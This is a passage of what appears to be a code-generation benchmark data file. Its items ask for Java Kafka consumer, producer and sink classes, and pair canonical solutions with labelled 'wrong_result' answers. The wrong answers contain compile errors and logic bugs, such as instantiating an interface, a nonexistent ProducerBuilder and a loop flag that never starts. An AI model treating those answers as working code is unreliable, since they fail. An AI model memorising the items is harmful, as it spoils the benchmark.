(this.consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = this.consumerRecords.next();\n            this.partitionOffsets.put(new TopicPartition(record.topic(), record.partition()), record.offset());\n            return record.value();\n        }\n        else {\n            return null;\n        }\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (this.saveState) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, new HashMap<>(this.partitionOffsets));\n        }\n        this.kafkaConsumer.commitSync();\n    }\n\n    @Override\n    public void close() {\n        if (this.kafkaConsumer != null) {\n            this.kafkaConsumer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "```java\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ItemReader;\nimport org.springframework.batch.item.ItemStreamReader;\nimport org.springframework.batch.item.support.AbstractItemReader;\nimport org.springframework.batch.core.ExecutionContext;\nimport org.springframework.batch.item.ItemStream;\nimport org.springframework.batch.item.ItemStreamException;\nimport org.springframework.batch.item.ParseException;\nimport org.springframework.batch.item.UnexpectedInputException;\nimport org.springframework.util.StringUtils;\nimport java.time.Duration;\nimport java.util.*;\n\npublic class KafkaItemReader<K, V> extends AbstractItemReader<K> implements ItemStreamReader<V>, ItemStream {\n    public static final String TOPIC_PARTITION_OFFSETS = \"topicPartitionOffsets\";\n    public static final long DEFAULT_POLL_TIMEOUT = 30L;\n    private List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout;\n    private boolean saveState;\n    private String topic;\n\n    public KafkaItemReader(Properties consumerProperties, String topic, Integer... partitions) {\n        this.consumerProperties = consumerProperties;\n        this.topic = topic;\n        List<Integer> partitionList = Arrays.asList(partitions);\n        this.topicPartitions = partitionList.stream()\n                .map(p -> new TopicPartition(topic, p))\n                .collect(Collectors.toList());\n        this.pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n        this.saveState = true;\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topic, List<Integer> partitions) {\n        this.consumerProperties = consumerProperties;\n        this.topic = topic;\n        this.topicPartitions = partitions.stream()\n                .map(p -> new TopicPartition(topic, p))\n                .collect(Collectors.toList());\n        this.pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n        this.saveState = true;\n    }\n\n    @Override\n    public void open(ExecutionContext context) {\n        kafkaConsumer = new KafkaConsumer<>(consumerProperties);\n        kafkaConsumer.assign(topicPartitions);\n        Map<TopicPartition, Long> restoredOffsets = context.getMap(TOPIC_PARTITION_OFFSETS);\n        if (restoredOffsets != null) {\n            partitionOffsets = new HashMap<>(restoredOffsets);\n            for (Map.Entry<TopicPartition, Long> entry : restoredOffsets.entrySet()) {\n                kafkaConsumer.seek(entry.getKey(), entry.getValue());\n            }\n        } else {\n            partitionOffsets = new HashMap<>();\n            for (TopicPartition partition : topicPartitions) {\n                kafkaConsumer.seek(partition, 0);\n            }\n        }\n    }\n\n    @Override\n    public V read() throws Exception {\n        consumerRecords = kafkaConsumer.poll(pollTimeout);\n        if (consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = consumerRecords.next();\n            TopicPartition partition = record.partition();\n            long offset = record.offset();\n            partitionOffsets.put(partition, offset);\n            return record.value();\n        } else {\n            return null;\n        }\n    }\n\n    @Override\n    public void update(ExecutionContext context) {\n        if (saveState) {\n            context.put(TOPIC_PARTITION_OFFSETS, partitionOffsets);\n            kafkaConsumer.commitSync();\n        }\n    }\n\n    @Override\n    public void close() throws ItemStreamException {\n        if (kafkaConsumer != null) {\n            kafkaConsumer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Create a Java class that implements a Kafka consumer thread for reading and processing messages from a Kafka topic, with support for message validation and local store updates.\n\nClass Description: KafkaStoreReaderThread is a thread-based Kafka consumer that reads messages from a specified topic, validates them using a handler, and updates a local store accordingly. It maintains offset tracking and provides shutdown capabilities.\n\nAttributes:\n- topic: String - The Kafka topic to consume messages from\n- topicPartition: TopicPartition - The topic partition being consumed\n- groupId: String - The consumer group ID\n- storeUpdateHandler: StoreUpdateHandler<K, V> - Handler for message validation\n- serializer: Serializer<K, V> - Serializer for message keys and values\n- localStore: Store<K, V> - Local storage for processed messages\n- offsetUpdateLock: ReentrantLock - Lock for thread-safe offset updates\n- offsetReachedThreshold: Condition - Condition for offset tracking\n- consumer: Consumer<byte[], byte[]> - Kafka consumer instance\n- offsetInSchemasTopic: long - Current offset in the topic\n- consumerProps: Properties - Configuration properties for the Kafka consumer\n\nMethods:\n- KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) -> void - Constructor that initializes the consumer with configuration and dependencies\n- doWork() -> void - Main work method that polls for messages, processes them, and updates the local store\n- shutdown() -> void - Gracefully shuts down the consumer thread",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.StoreUpdateHandler.ValidationStatus;\nimport io.confluent.kafka.schemaregistry.utils.ShutdownableThread;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.errors.WakeupException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends ShutdownableThread {\n\n  private static final Logger log = LoggerFactory.getLogger(KafkaStoreReaderThread.class);\n\n  private final String topic;\n  private final TopicPartition topicPartition;\n  private final String groupId;\n  private final StoreUpdateHandler<K, V> storeUpdateHandler;\n  private final Serializer<K, V> serializer;\n  private final Store<K, V> localStore;\n  private final ReentrantLock offsetUpdateLock;\n  private final Condition offsetReachedThreshold;\n  private Consumer<byte[], byte[]> consumer;\n  private long offsetInSchemasTopic = -1L;\n  private Properties consumerProps = new Properties();\n\n  public KafkaStoreReaderThread(String bootstrapBrokers,\n                              String topic,\n                              String groupId,\n                              StoreUpdateHandler<K, V> storeUpdateHandler,\n                              Serializer<K, V> serializer,\n                              Store<K, V> localStore) {\n    super(\"kafka-store-reader-thread-\" + topic, false);\n    offsetUpdateLock = new ReentrantLock();\n    offsetReachedThreshold = offsetUpdateLock.newCondition();\n    this.topic = topic;\n    this.groupId = groupId;\n    this.storeUpdateHandler = storeUpdateHandler;\n    this.serializer = serializer;\n    this.localStore = localStore;\n\n    consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, this.groupId);\n    consumerProps.put(ConsumerConfig.CLIENT_ID_CONFIG, \"KafkaStore-reader-\" + this.topic);\n    consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n    consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n    consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n    consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n    consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n\n    this.consumer = new KafkaConsumer<>(consumerProps);\n    this.topicPartition = new TopicPartition(topic, 0);\n    List<TopicPartition> topicPartitions = Arrays.asList(this.topicPartition);\n    this.consumer.assign(topicPartitions);\n    consumer.seekToBeginning(topicPartitions);\n  }\n\n  @Override\n  public void doWork() {\n    try {\n      ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(Long.MAX_VALUE));\n      for (ConsumerRecord<byte[], byte[]> record : records) {\n        K messageKey = this.serializer.deserializeKey(record.key());\n        V message = record.value() == null ? null : serializer.deserializeValue(messageKey, record.value());\n        \n        TopicPartition tp = new TopicPartition(record.topic(), record.partition());\n        long offset = record.offset();\n        long timestamp = record.timestamp();\n        ValidationStatus status = this.storeUpdateHandler.validateUpdate(\n                messageKey, message, tp, offset, timestamp);\n        \n        if (status == ValidationStatus.SUCCESS) {\n          if (message == null) {\n            localStore.delete(messageKey);\n          } else {\n            localStore.put(messageKey, message);\n          }\n        }\n\n        try {\n          offsetUpdateLock.lock();\n          offsetInSchemasTopic = record.offset();\n          offsetReachedThreshold.signalAll();\n        } finally {\n          offsetUpdateLock.unlock();\n        }\n      }\n    } catch (WakeupException we) {\n      // Thread is closing\n    } catch (RecordTooLargeException rtle) {\n      throw new IllegalStateException(\"Consumer threw RecordTooLargeException\", rtle);\n    } catch (RuntimeException e) {\n      log.error(\"KafkaStoreReader thread has died\", e);\n      throw e;\n    }\n  }\n\n  @Override\n  public void shutdown() {\n    super.initiateShutdown();\n    if (consumer != null) {\n      consumer.wakeup();\n    }\n    super.awaitShutdown();\n    if (consumer != null) {\n      consumer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "public class KafkaStoreReaderThread<K, V> extends Thread {\n    private String topic;\n    private TopicPartition topicPartition;\n    private String groupId;\n    private StoreUpdateHandler<K, V> storeUpdateHandler;\n    private Serializer<K, V> serializer;\n    private Store<K, V> localStore;\n    private ReentrantLock offsetUpdateLock;\n    private Condition offsetReachedThreshold;\n    private Consumer<byte[], byte[]> consumer;\n    private long offsetInSchemasTopic;\n    private Properties consumerProps;\n\n    public KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) {\n        this.topic = topic;\n        this.groupId = groupId;\n        this.storeUpdateHandler = storeUpdateHandler;\n        this.serializer = serializer;\n        this.localStore = localStore;\n        this.consumerProps = new Properties();\n        this.consumerProps.put(\"bootstrap.servers\", bootstrapBrokers);\n        this.consumerProps.put(\"group.id\", groupId);\n        this.consumerProps.put(\"key.deserializer\", \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumerProps.put(\"value.deserializer\", \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumer = new Consumer<>(consumerProps);\n        this.topicPartition = new TopicPartition(topic, 0);\n        this.offsetUpdateLock = new ReentrantLock();\n        this.offsetReachedThreshold = offsetUpdateLock.newCondition();\n        this.offsetInSchemasTopic = 0;\n        this.consumer.subscribe(Collections.singletonList(topic));\n        this.consumer.assign(Collections.singletonList(topicPartition));\n    }\n\n    @Override\n    public void run() {\n        doWork();\n    }\n\n    private void doWork() {\n        while (true) {\n            ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(100));\n            for (ConsumerRecord<byte[], byte[]> record : records) {\n                K key = serializer.deserializeKey(record.key());\n                V value = serializer.deserializeValue(record.value());\n                if (storeUpdateHandler.validate(key, value)) {\n                    localStore.update(key, value);\n                    offsetInSchemasTopic++;\n                    offsetUpdateLock.lock();\n                    try {\n                        offsetReachedThreshold.signal();\n                    } finally {\n                        offsetUpdateLock.unlock();\n                    }\n                }\n            }\n        }\n    }\n\n    public void shutdown() {\n        consumer.close();\n    }\n}"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Kafka consumer class in Java that continuously polls messages from a specified Kafka topic and processes them asynchronously. The class should handle initialization and cleanup properly, and allow for graceful shutdown.\n\nClass Description: KafkaConsumeOrderWorkaround is a Spring component that implements a Kafka consumer worker thread. It consumes messages from a configured Kafka topic, commits offsets asynchronously, and can be gracefully stopped. The consumer runs in a separate thread to avoid blocking the main application.\n\nAttributes:\n- bootstrapServers: String - Kafka broker addresses injected from configuration\n- topicName: String - Kafka topic name to subscribe to, injected from configuration\n- consumerGroup: String - Consumer group ID (default: \"order\")\n- consumer: Consumer<Long, String> - Kafka consumer instance\n- pollingInterval: long - Polling interval in milliseconds (default: 250ms)\n- running: boolean - Flag to control the consumer thread's execution\n- consumerThread: Thread - The thread running the Kafka consumer\n\nMethods:\n- startConsuming() -> void - Initializes and starts the Kafka consumer thread. Configures consumer properties, creates consumer instance, subscribes to topic, and begins polling loop. Annotated with @PostConstruct to run after bean initialization.\n- stopConsuming() -> void - Signals the consumer thread to stop by setting running flag to false. Annotated with @PreDestroy to run before bean destruction.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Properties;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${spring.cloud.stream.kafka.binder.brokers}\")\n    private String bootstrapServers;\n\n    @Value(\"${spring.cloud.stream.bindings.input.destination}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = true;\n    private Thread consumerThread;\n\n    @PostConstruct\n    public void startConsuming() {\n        consumerThread = new Thread(\"kafka-workaround-consumer\") {\n            public void run() {\n                final Properties props = new Properties();\n                props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n                props.put(ConsumerConfig.GROUP_ID_CONFIG, consumerGroup);\n                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());\n\n                consumer = new KafkaConsumer<>(props);\n                consumer.subscribe(Collections.singletonList(topicName));\n                while (running) {\n                    consumer.poll(pollingInterval);\n                    consumer.commitAsync();\n                }\n                consumer.close();\n            }\n        };\n        consumerThread.start();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "import org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.serialization.LongDeserializer;\nimport org.apache.kafka.common.serialization.StringDeserializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.regex.Pattern;\n\n@Component\npublic class KafkaConsumeOrderWorkaround {\n\n    @Value(\"${kafka.bootstrap.servers}\")\n    private String bootstrapServers;\n\n    @Value(\"${kafka.topic.name}\")\n    private String topicName;\n\n    private String consumerGroup = \"order\";\n\n    private Consumer<Long, String> consumer;\n    private long pollingInterval = 250;\n    private boolean running = false;\n    private Thread consumerThread;\n    private final ExecutorService executor = Executors.newSingleThreadExecutor();\n\n    @PostConstruct\n    public void startConsuming() {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapServers);\n        props.put(\"group.id\", consumerGroup);\n        props.put(\"key.deserializer\", LongDeserializer.class.getName());\n        props.put(\"value.deserializer\", StringDeserializer.class.getName());\n        props.put(\"request.timeout.ms\", pollingInterval);\n        props.put(\"auto.offset.reset\", \"earliest\");\n        consumer = new KafkaConsumer<>(props);\n        consumer.subscribe(Pattern.compile(topicName));\n        consumerThread = new Thread(this::consumeLoop);\n        consumerThread.start();\n    }\n\n    private void consumeLoop() {\n        while (running) {\n            try {\n                var records = consumer.poll(pollingInterval);\n                for (var record : records) {\n                    executor.submit(() -> {\n                        // Process message asynchronously\n                        System.out.println(\"Processing message: \" + record.value());\n                    });\n                }\n                consumer.commitAsync();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        consumer.close();\n    }\n\n    @PreDestroy\n    public void stopConsuming() {\n        running = false;\n        try {\n            if (consumer != null) {\n                consumer.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Create a Kafka producer class that handles message serialization and sending to a Kafka topic with configurable properties and error handling.\n\nClass Description: The KafkaStoreProducer class is a generic Kafka producer that serializes and sends key-value pairs to a specified Kafka topic. It provides configurable timeout settings and handles various Kafka-related exceptions.\n\nAttributes:\n- producer: KafkaProducer<byte[], byte[]> - The underlying Kafka producer instance\n- topic: String - The Kafka topic to which messages will be sent\n- serializer: Serializer<K, V> - The serializer for key-value pairs\n- timeout: int - The maximum time to wait for message acknowledgment in milliseconds\n\nMethods:\n- Constructor: KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) -> void - Initializes the Kafka producer with configuration properties including bootstrap servers, topic, serializer, timeout, and additional custom properties\n- put: put(K key, V value) -> V - Serializes and sends a key-value pair to the Kafka topic, returning the value if successful. Throws StoreTimeoutException if the operation times out or StoreException for other errors\n- close: close() -> void - Closes the Kafka producer and releases all resources",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.exceptions.StoreException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.StoreTimeoutException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.SerializationException;\nimport io.confluent.kafka.schemaregistry.storage.serialization.Serializer;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaStoreProducer<K, V> {\n\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, \n                            Serializer<K, V> serializer, int timeout,\n                            Properties configProps) {\n        Properties props = new Properties();\n        props.putAll(configProps);\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        props.put(ProducerConfig.ACKS_CONFIG, \"-1\");\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);\n\n        this.producer = new KafkaProducer<>(props);\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n    }\n\n    public V put(K key, V value) throws StoreTimeoutException, StoreException {\n        if (key == null) {\n            throw new StoreException(\"Key should not be null\");\n        }\n\n        ProducerRecord<byte[], byte[]> producerRecord;\n        try {\n            producerRecord = new ProducerRecord<>(\n                topic, \n                0, \n                this.serializer.serializeKey(key),\n                value == null ? null : this.serializer.serializeValue(value)\n            );\n        } catch (SerializationException e) {\n            throw new StoreException(\"Error serializing schema while creating the Kafka produce record\", e);\n        }\n\n        try {\n            Future<RecordMetadata> ack = producer.send(producerRecord);\n            RecordMetadata recordMetadata = ack.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (InterruptedException e) {\n            throw new StoreException(\"Put operation interrupted while waiting for an ack from Kafka\", e);\n        } catch (ExecutionException e) {\n            if (e.getCause() instanceof RecordTooLargeException) {\n                throw new StoreException(\"Put operation failed because entry is too large\");\n            } else {\n                throw new StoreException(\"Put operation failed while waiting for an ack from Kafka\", e);\n            }\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\n                \"Put operation timed out while waiting for an ack from Kafka\", e);\n        } catch (KafkaException ke) {\n            throw new StoreException(\"Put operation to Kafka failed\", ke);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaStoreProducer<K, V> {\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) {\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapBrokers);\n        props.putAll(configProps);\n        this.producer = new KafkaProducer<>(props);\n    }\n\n    public V put(K key, V value) {\n        try {\n            byte[] keyBytes = serializer.serialize(key);\n            byte[] valueBytes = serializer.serialize(value);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, keyBytes, valueBytes);\n            Future<RecordMetadata> future = producer.send(record);\n            RecordMetadata metadata = future.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\"Message send timed out\");\n        } catch (Exception e) {\n            throw new StoreException(\"Error sending message: \" + e.getMessage());\n        }\n    }\n\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Create a Kafka producer wrapper class in Java that simplifies sending JSON data to Kafka topics.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for producing messages to Kafka topics. It handles producer creation, message serialization, and error handling internally.\n\nAttributes:\n- kafkaProducer: Producer<Long, String> - The underlying Kafka producer instance\n- kafkaBrokers: String - Comma-separated list of Kafka broker addresses\n- gson: Gson - JSON serializer/deserializer instance\n\nMethods:\n- createKafkaProducer() -> Producer<Long, String> - Creates and configures a new Kafka producer instance with the specified broker addresses and serializers\n- send2Kafka(JsonElement jsonElement, String topicName) -> void - Serializes the JSON element and sends it to the specified Kafka topic\n- close() -> void - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport com.google.gson.JsonElement;\nimport com.google.gson.Gson;\n\npublic class KafkaProducerWrapper {\n\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, Launcher.getInstanceId());\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, 10000);\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName,\n                gson.toJson(jsonElement));\n        try {\n            kafkaProducer.send(record).get();\n        } \n        catch (ExecutionException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n        } catch (InterruptedException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "import com.google.gson.Gson;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerBuilder;\nimport java.util.Properties;\n\npublic class KafkaProducerWrapper {\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson;\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.gson = new Gson();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        kafkaProducer = new ProducerBuilder<>().build(props);\n        return kafkaProducer;\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        String jsonValue = gson.toJson(jsonElement);\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName, null, jsonValue);\n        kafkaProducer.send(record);\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Create a Kafka sink class that writes data to a Kafka topic, with configuration parameters for the Kafka producer and topic name.\n\nClass Description: The KafkaSink class is a self-documenting sink that takes data from an observable stream, encodes it, and writes it to a specified Kafka topic. It handles Kafka producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- encoder: [Func1<T, byte[]>] - Function to encode the input data into byte arrays\n- registry: [Registry] - Metrics registry for monitoring\n- kafkaProducerAtomicRef: [AtomicReference<KafkaProducer<byte[], byte[]>>] - Thread-safe reference to the Kafka producer instance\n- subscription: [Subscription] - Subscription to the observable data stream\n\nMethods:\n- call: [call(Context context, PortRequest ignore, Observable<T> dataO)] -> [void] - Initializes the Kafka producer if needed and subscribes to the input observable to send data to Kafka\n- getParameters: [getParameters()] -> [List<ParameterDefinition<?>>] - Returns the list of parameter definitions for Kafka configuration and topic name\n- metadata: [metadata()] -> [Metadata] - Provides metadata about the sink including name and description\n- close: [close()] -> [void] - Cleans up resources by unsubscribing from the observable stream",
    "Canonical_solution": "import com.netflix.spectator.api.Registry;\nimport io.mantisrx.runtime.Context;\nimport io.mantisrx.runtime.Metadata;\nimport io.mantisrx.runtime.PortRequest;\nimport io.mantisrx.runtime.parameter.ParameterDefinition;\nimport io.mantisrx.runtime.parameter.Parameters;\nimport io.mantisrx.runtime.parameter.type.StringParameter;\nimport io.mantisrx.runtime.parameter.validator.Validators;\nimport io.mantisrx.runtime.sink.SelfDocumentingSink;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> implements SelfDocumentingSink<T> {\n    private static final Logger logger = LoggerFactory.getLogger(KafkaSink.class);\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>(null);\n    private Subscription subscription;\n\n    KafkaSink(Registry registry, Func1<T, byte[]> encoder) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    @Override\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            MantisKafkaProducerConfig mantisKafkaProducerConfig = new MantisKafkaProducerConfig(context);\n            Map<String, Object> producerProperties = mantisKafkaProducerConfig.getProducerProperties();\n            KafkaProducer<byte[], byte[]> kafkaProducer = new KafkaProducer<>(producerProperties);\n            kafkaProducerAtomicRef.compareAndSet(null, kafkaProducer);\n            logger.info(\"Kafka Producer initialized\");\n        }\n        KafkaProducer<byte[], byte[]> kafkaProducer = kafkaProducerAtomicRef.get();\n        Parameters parameters = context.getParameters();\n        String topic = (String)parameters.get(KafkaSinkJobParameters.TOPIC);\n\n        subscription = dataO.map(encoder::call)\n            .flatMap((dataBytes) ->\n                         Observable.from(kafkaProducer.send(new ProducerRecord<>(topic, dataBytes)))\n                             .subscribeOn(Schedulers.io()))\n            .subscribe();\n    }\n\n    @Override\n    public List<ParameterDefinition<?>> getParameters() {\n        final List<ParameterDefinition<?>> params = new ArrayList<>();\n        params.add(new StringParameter()\n                       .name(KafkaSinkJobParameters.TOPIC)\n                       .description(\"Kafka topic to write to\")\n                       .validator(Validators.notNullOrEmpty())\n                       .required()\n                       .build());\n        params.addAll(MantisKafkaProducerConfig.getJobParameterDefinitions());\n        return params;\n    }\n\n    @Override\n    public Metadata metadata() {\n        StringBuilder description = new StringBuilder();\n        description.append(\"Writes the output of the job into the configured Kafka topic\");\n\n        return new Metadata.Builder()\n            .name(\"Mantis Kafka Sink\")\n            .description(description.toString())\n            .build();\n    }\n\n    